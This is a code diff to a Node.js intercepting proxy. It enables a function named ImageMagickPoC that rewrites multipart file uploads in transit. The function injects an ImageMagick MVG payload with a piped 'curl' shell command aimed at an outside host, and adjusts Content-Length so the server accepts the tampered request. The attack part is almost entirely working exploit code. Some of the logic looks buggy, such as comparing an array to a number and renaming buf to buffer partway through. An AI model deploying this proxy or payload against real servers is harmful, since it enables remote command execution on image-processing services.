@@ -23,27 +23,47 @@ function buffer_find_body(b)
 	return -1;
 }
 
+var payload = "push graphic-context\r\nviewbox 0 0 640 480\r\nfill 'url(https://www.example.com/1.png \"|curl http://www.baidu.com\")'\r\npop graphic-context\r\n";
 function ImageMagickPoC(buf) {
-	var _body_pos = buffer_find_body(buf);
-	var _header = buf.slice(0,_body_pos);
-	var _body = buf.slice(_body_pos);
+        var _body_pos = buffer_find_body(buf);
+        var _header = buf.slice(0,_body_pos);
+        var _body = buf.slice(_body_pos);
 
-	var _content_type = _header.toString('utf8').match(/Content-Type:.+/g)[0].split("=");
-	if(2>_content_type.length){
+        var _content_type = _header.toString('utf8').match(/Content-Type:.+/g);
+	if(_content_type != null){
+		_content_type = _content_type[0].split("=");
+	}else{
 		return ;
 	}
-	_file_body = _body.toString('utf8').split(_content_type[1]);
-	if(4>_file_body.length){
-		return ;
-	}
-	_new_body = _file_body[1] + "push graphic-context\r\nviewbox 0 0 640 480\r\nfill 'url(https://www.example.com/1.png \"|curl http://www.baidu.com\")'\r\npop graphic-context";
-	_new_content = _content_type[1]+'\r\n'+_new_body;
-	_new_content += '\r\n'+_content_type[1];
-	_new_content += '\r\n'+_file_body[2];
-	_new_content += '\r\n'+_content_type[1]+_file_body[3]+'\r\n';
+        if(2>_content_type.length){
+                return ;
+        }
+		_content_type = '--'+_content_type[1];
+        _file_body = _body.toString('utf8').split(_content_type);
+		console.log("body length: "+_file_body.length);
+        if(4>_file_body.length){
+                return ;
+        }
 
-	//console.log(_new_content);
-	return _new_content;
+        var _file_body_tmp = _file_body[1];
+        var _new_body_buf = new Buffer(_file_body_tmp,'utf8');
+        var _new_payload_buf = new Buffer(payload,'utf8');
+        var _attr = new Buffer(_file_body[2],'utf8');
+
+        var _new_sp_1 = new Buffer(_content_type,'utf8');
+        var _new_sp_2 = new Buffer(_content_type,'utf8');
+        var _new_sp_3 = new Buffer(_content_type+_file_body[3],'utf8');
+
+        var _buf_length = _new_sp_1.length+_new_body_buf.length+_new_payload_buf.length+_new_sp_2.length+_attr.length+_new_sp_3.length;
+        var _new_content_buf = new Buffer(_buf_length);
+        _new_sp_1.copy(_new_content_buf)
+        _new_body_buf.copy(_new_content_buf,_new_sp_1.length);
+        _new_payload_buf.copy(_new_content_buf,_new_sp_1.length+_new_body_buf.length);
+        _new_sp_2.copy(_new_content_buf,_new_sp_1.length+_new_body_buf.length+_new_payload_buf.length);
+        _attr.copy(_new_content_buf,_new_sp_2.length+_new_sp_1.length+_new_body_buf.length+_new_payload_buf.length);
+        _new_sp_3.copy(_new_content_buf,_attr.length+_new_sp_2.length+_new_sp_1.length+_new_body_buf.length+_new_payload_buf.length);
+
+        return _new_content_buf;
 }
 
 net.createServer(function (client)
@@ -108,24 +128,43 @@ net.createServer(function (client)
 			var _body_pos = buffer_find_body(buf);
 			if (_body_pos < 0) _body_pos = buf.length;
 			var _header = buf.slice(0,_body_pos).toString('utf8');
+			var _content_length = _header.match(/Content-Length: [\d]+/g);
+			if(2>_content_length){
+				_content_length = 0;
+			}else{
+				_content_length = _content_length[0].split(":")[1].trim();
+				//console.log("content length: "+_content_length);
+				_payload_length = new Buffer(payload);
+				_content_length = parseInt(_content_length)+_payload_length.length;
+			}
 			_header = _header.replace(/(proxy-)?connection:.+\r\n/ig,'')
 					.replace(/Keep-Alive:.+\r\n/i,'')
 					.replace("\r\n",'\r\nConnection: close\r\n');
+			//console.log("header: "+_header);
 			if (req.httpVersion == '1.1')
 			{
 				var url = req.path.replace(/http[s?]:\/\/[^/]+/,'');
 				if (url.path != url) _header = _header.replace(req.path,url);
 			}
-			var _buf_1 = new Buffer(_header,'utf8');
-			var _buf_2 = buf.slice(_body_pos);
-			
+			var _buf_2 = null;
+
 			//POST FILE
-			//_image_magick_poc = ImageMagickPoC(buf);
+			var _upload_file = ImageMagickPoC(buf);
+			if(typeof _upload_file != 'undefined'){
+				_header = _header.replace(/Content-Length: [\d]+\r\n/i,'')
+                               			 .replace("\r\n",'\r\nContent-Length: '+ _content_length + '\r\n');
+				_buf_2 = _upload_file;
+			}else{
+				_buf_2 = buf.slice(_body_pos);
+			}
+
+			var _buf_1 = new Buffer(_header,'utf8');
 			var re = new Buffer(_buf_1.length + _buf_2.length);
 			_buf_1.copy(re);
 			_buf_2.copy(re,_buf_1.length);
-			buf = re;
-			console.log("\r\nreplace buf:\r\n"+buf);
+			buffer = re;
+			console.log("\r\nreplace buf:\r\n"+buffer);
+		
 		}
 		var server = net.createConnection(req.port,req.hostname);
 		server.on("data", function(data){ console.log("\r\nServer Data:\r\n"+data);client.write(data); });
@@ -133,15 +172,17 @@ net.createServer(function (client)
 		if (req.method == 'CONNECT')
 			client.write(new Buffer("HTTP/1.1 200 Connection established\r\nConnection: close\r\n\r\n"));
 		else
-			server.write(buf);
+			server.write(buffer);
 		
 	}
 	
 }).listen(local_port);
 console.log('Proxy server running at localhost: '+local_port);
 
+/*
 process.on('uncaughtException', function(err)
 {
 	console.log("\nError:");
 	console.log("\t"+err);
 });
+*/
